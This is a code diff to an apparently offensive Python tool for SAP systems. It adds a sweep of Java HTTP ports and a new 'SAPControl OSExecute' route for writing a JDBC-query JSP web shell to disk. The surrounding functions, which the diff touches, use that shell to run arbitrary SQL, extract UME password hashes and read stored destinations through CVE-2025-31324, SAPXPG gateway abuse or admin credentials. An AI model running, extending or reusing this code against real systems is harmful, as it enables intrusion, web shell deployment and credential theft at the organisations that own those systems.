@@ -145,6 +145,47 @@ def _ensure_java_db_jsp(node: SAPNode) -> str:
                     http_port = p; break
             if http_port: break
     if not http_port:
+        # Self-discovery: probe /useradmin/ across the common Java
+        # HTTP ports (50N00).  A HTTP response — any status — proves
+        # the port hosts an AS Java, so we can target it for deploy.
+        # This covers the case where the port came from a lateral-
+        # pivot destination (e.g. S4H_TO_SJJ at :50200) and no
+        # standalone fingerprint pass ever ran against the node.
+        _host = node.ip or node.hostname
+        if _host:
+            print(f"[*] {node.sid}: no Java HTTP port on node — sweeping "
+                  f"50N00 candidates via /useradmin/ probe")
+            try:
+                import sapmap_rfc as _rfc_pre
+                _seen = set()
+                _cands = []
+                for _inst in getattr(node, "instances", []) or []:
+                    try:
+                        _nn = int(_inst.instance_nr)
+                        _p = 50000 + _nn * 100
+                        if _p not in _seen:
+                            _seen.add(_p); _cands.append(_p)
+                    except (ValueError, AttributeError, TypeError):
+                        pass
+                for _fb in (50000, 50100, 50200, 50300):
+                    if _fb not in _seen:
+                        _seen.add(_fb); _cands.append(_fb)
+                for _p in _cands:
+                    _url = f"http://{_host}:{_p}/useradmin/"
+                    _r = _rfc_pre.http_basic_auth_probe(
+                        _url, "sapmap_probe", "x", timeout=3.0)
+                    if _r.get("ok"):
+                        print(f"[+] {node.sid}: probe found live Java "
+                              f"HTTP port {_p} (HTTP {_r.get('status')})")
+                        http_port = _p
+                        # Backfill onto node so future ops skip the sweep.
+                        from sapmap_exploit import _mark_java_http_port
+                        _mark_java_http_port(node, _p)
+                        break
+            except Exception as _e:
+                print(f"[!] {node.sid}: Java HTTP port sweep errored "
+                      f"({type(_e).__name__}: {_e}) — will bail out")
+    if not http_port:
         print(f"[-] {node.sid}: no Java HTTP port known — cannot deploy JDBC JSP")
         return ""
     java_inst = (http_port - 50000) // 100
@@ -154,8 +195,16 @@ def _ensure_java_db_jsp(node: SAPNode) -> str:
     jsp_url = f"http://{node.ip or node.hostname}:{http_port}/irj/{jsp_name}"
     _ctc_ok    = _ctc_deploy_available(node)
     _telnet_ok = (not _ctc_ok) and _telnet_deploy_available(node)
+    # SAPControl OSExecute pivot — when a Type-G destination has been
+    # verified as an OS shell against this node's sapstartsrv, we can
+    # write the JSP directly to disk via the same chunked-echo pattern
+    # the GW SAPXPG path uses.  _deploy_jsp_via_gw internally calls
+    # execute_os_command, which picks the SAPControl channel over GW
+    # when both are present — so the same helper covers both cases.
+    _sc_osexec_ok = bool(getattr(node, "_cached_sapcontrol_pivot", None))
     delivery = ("CVE-2025-31324" if node.cve_2025_31324_vulnerable
                 else "GW SAPXPG"  if node.gw_vulnerable
+                else "SAPControl OSExecute" if _sc_osexec_ok
                 else "CTC ConfigServlet (UME admin)" if _ctc_ok
                 else "Telnet (UME admin)" if _telnet_ok
                 else "NONE")
@@ -181,15 +230,20 @@ def _ensure_java_db_jsp(node: SAPNode) -> str:
             return ""
         print(f"[+] {node.sid}:   wrote {w['chunks_written']} chunk(s) of "
               f"base64 + certutil-decoded into {target_path}")
-    elif node.gw_vulnerable:
+    elif node.gw_vulnerable or _sc_osexec_ok:
+        # _deploy_jsp_via_gw calls execute_os_command internally, which
+        # transparently picks the right channel: GW SAPXPG when the
+        # gateway is vulnerable, else the SAPControl OSExecute pivot
+        # when a verified Type-G destination has been cached.  Either
+        # way we get chunked base64-echo + decode into target_path.
         w = _deploy_jsp_via_gw(node, _jdb.JDBC_QUERY_JSP.encode("utf-8"),
                                  target_path, label="JDBC-query JSP")
         if not w.get("success"):
-            print(f"[-] {node.sid}: JDBC JSP GW write failed: "
+            print(f"[-] {node.sid}: JDBC JSP OS-exec write failed: "
                   f"{w.get('error', '?')}")
             return ""
         print(f"[+] {node.sid}:   wrote {w.get('bytes_written', 0)} bytes "
-              f"via {w.get('method', 'gw')}")
+              f"via {w.get('method', 'os_exec')}")
     elif _ctc_ok or _telnet_ok:
         # Post-RECON paths: try CTC first (HTTP, same port as RECON),
         # fall through to Telnet for hardened targets that removed
@@ -227,7 +281,9 @@ def _ensure_java_db_jsp(node: SAPNode) -> str:
     else:
         print(f"[-] {node.sid}: no deployment path "
               f"(CVE-31324 vuln={node.cve_2025_31324_vulnerable}, "
-              f"GW vuln={node.gw_vulnerable}, Java-admin-user=no)")
+              f"GW vuln={node.gw_vulnerable}, "
+              f"SAPControl OSExecute={_sc_osexec_ok}, "
+              f"Java-admin-user=no)")
         return ""
 
     print(f"[+] {node.sid}: JDBC-query JSP at {jsp_url}")
@@ -262,8 +318,8 @@ def download_java_table(node: SAPNode, table: str, fields: str = "",
     jsp_url = _ensure_java_db_jsp(node)
     if not jsp_url:
         return {"success": False,
-                "error": "Could not deploy JDBC JSP (need CVE-2025-31324 "
-                         "or GW SAPXPG vuln)"}
+                "error": "Could not deploy JDBC JSP (need CVE-2025-31324, "
+                         "GW SAPXPG, SAPControl OSExecute pivot, or UME admin cred)"}
     cols = fields.strip() if fields else "*"
     sql = f"SELECT {cols} FROM {table}"
     if where.strip():
@@ -302,7 +358,7 @@ def extract_java_password_hashes(node: SAPNode) -> dict:
     if not jsp_url:
         return {"success": False,
                 "error": "Could not deploy JDBC JSP "
-                         "(need CVE-2025-31324 or GW SAPXPG vuln)"}
+                         "(need CVE-2025-31324, GW SAPXPG, SAPControl OSExecute pivot, or UME admin cred)"}
 
     print(f"[*] {node.sid}: Step 2/3 — query UME_STRINGS for j_password rows")
     print(f"[*] {node.sid}:   SQL: {_jdb.UME_HASH_QUERY}")
@@ -496,7 +552,7 @@ def assess_java_impact(node: SAPNode, state: SAPMAPState) -> dict:
     print(f"[*] {node.sid}: Step 1/3 — ensure JDBC-query JSP is deployed")
     jsp_url = _ensure_java_db_jsp(node)
     if not jsp_url:
-        result["error"] = "Could not deploy JDBC JSP (need CVE-2025-31324 or GW vuln)"
+        result["error"] = "Could not deploy JDBC JSP (need CVE-2025-31324, GW SAPXPG, SAPControl OSExecute pivot, or UME admin cred)"
         return result
 
     print(f"[*] {node.sid}: Step 2/3 — inventory deployed components from "
@@ -611,7 +667,7 @@ def read_java_destinations(node: SAPNode, state: SAPMAPState) -> dict:
     print(f"[*] {node.sid}: Step 1/3 — ensure JDBC-query JSP is deployed")
     jsp_url = _ensure_java_db_jsp(node)
     if not jsp_url:
-        result["error"] = "Could not deploy JDBC JSP (need CVE-2025-31324 or GW vuln)"
+        result["error"] = "Could not deploy JDBC JSP (need CVE-2025-31324, GW SAPXPG, SAPControl OSExecute pivot, or UME admin cred)"
         return result
 
     print(f"[*] {node.sid}: Step 2/3 — query J2EE_CONFIGENTRY for "
